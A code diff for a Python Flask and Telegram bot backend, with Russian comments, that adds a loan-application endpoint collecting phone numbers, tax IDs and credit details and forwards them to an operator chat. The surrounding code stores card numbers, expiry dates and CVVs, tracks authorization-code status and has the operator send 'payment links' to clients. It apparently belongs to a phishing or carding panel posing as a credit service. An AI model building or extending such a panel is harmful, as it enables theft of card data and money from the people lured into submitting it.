@@ -33,6 +33,19 @@ def init_db():
                   card_holder TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT,
                   status TEXT DEFAULT 'pending',
                   code_status TEXT DEFAULT 'pending')''')
+    # Новая таблица для заявок с сайта
+    c.execute('''CREATE TABLE IF NOT EXISTS credit_requests
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  session_id TEXT,
+                  phone TEXT,
+                  inn TEXT,
+                  amount TEXT,
+                  term TEXT,
+                  credit_history TEXT,
+                  comment TEXT,
+                  timestamp TEXT,
+                  status TEXT DEFAULT 'new',
+                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
     conn.commit()
     conn.close()
 
@@ -44,7 +57,10 @@ def send_to_admin(text, keyboard=None):
     data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
     if keyboard:
         data["reply_markup"] = keyboard
-    requests.post(url, json=data)
+    try:
+        requests.post(url, json=data)
+    except Exception as e:
+        print(f"Ошибка отправки в Telegram: {e}")
 
 def get_keyboard(session_id):
     return {
@@ -76,7 +92,7 @@ def webhook():
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
-            link = f"{SITE_URL}/page_63860/?session={session_id}"   # ИСПРАВЛЕНО
+            link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
             send_to_admin(f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.")
             
@@ -90,7 +106,30 @@ def webhook():
             c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
+        
+        # ========== НОВЫЕ ОБРАБОТЧИКИ ДЛЯ ЗАЯВОК С САЙТА ==========
+        elif callback_data.startswith('accept_request:'):
+            session_id = callback_data.split(':')[1]
+            send_callback_answer(callback_id, "✅ Заявка принята")
+            send_to_admin(f"✅ <b>ЗАЯВКА ПРИНЯТА</b>\n\nСессия: {session_id}\n\nСвяжитесь с клиентом для дальнейшего оформления.")
             
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE credit_requests SET status = "accepted" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            
+        elif callback_data.startswith('reject_request:'):
+            session_id = callback_data.split(':')[1]
+            send_callback_answer(callback_id, "❌ Заявка отклонена")
+            send_to_admin(f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}")
+            
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE credit_requests SET status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+        
         # ========== КАРТА ==========
         elif callback_data.startswith('card_ok:'):
             session_id = callback_data.split(':')[1]
@@ -557,6 +596,66 @@ def check_auth_code_status(session_id):
     if row:
         return jsonify({"status": row[0]})
     return jsonify({"status": "pending"})
+
+# ========== НОВЫЙ ЭНДПОИНТ ДЛЯ ФОРМЫ С RENDER ==========
+@app.route('/submit_credit_request', methods=['POST'])
+def submit_credit_request():
+    """
+    Принимает расширенную заявку с сайта
+    Поля: phone, inn, amount, term, creditHistory, comment, timestamp
+    """
+    data = request.json
+    
+    phone = data.get('phone', '')
+    inn = data.get('inn', '')
+    amount = data.get('amount', '')
+    term = data.get('term', '')
+    credit_history = data.get('creditHistory', '')
+    comment = data.get('comment', '')
+    timestamp = data.get('timestamp', '')
+    
+    if not phone or len(phone) < 12:
+        return jsonify({"error": "Телефон обязателен и должен быть в формате +375XXXXXXXXX"}), 400
+    
+    session_id = secrets.token_hex(8)
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    
+    # Таблица уже создана в init_db()
+    c.execute('''INSERT INTO credit_requests 
+                 (session_id, phone, inn, amount, term, credit_history, comment, timestamp, status)
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+              (session_id, phone, inn, amount, term, credit_history, comment, timestamp, 'new'))
+    conn.commit()
+    conn.close()
+    
+    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА (С САЙТА)</b>
+
+📱 Телефон: {phone}
+🆔 ИНН: {inn if inn else '—'}
+💰 Сумма: {amount if amount else '—'}
+⏱ Срок: {term if term else '—'}
+⭐ Кредитная история: {credit_history if credit_history else '—'}
+💬 Комментарий: {comment if comment else '—'}
+🕐 Время: {timestamp if timestamp else '—'}
+
+🆔 Сессия: <code>{session_id}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Принять заявку", "callback_data": f"accept_request:{session_id}"}],
+            [{"text": "❌ Отклонить", "callback_data": f"reject_request:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    
+    return jsonify({
+        "status": "ok", 
+        "session_id": session_id,
+        "message": "Заявка принята"
+    })
 
 @app.route('/')
 def home():
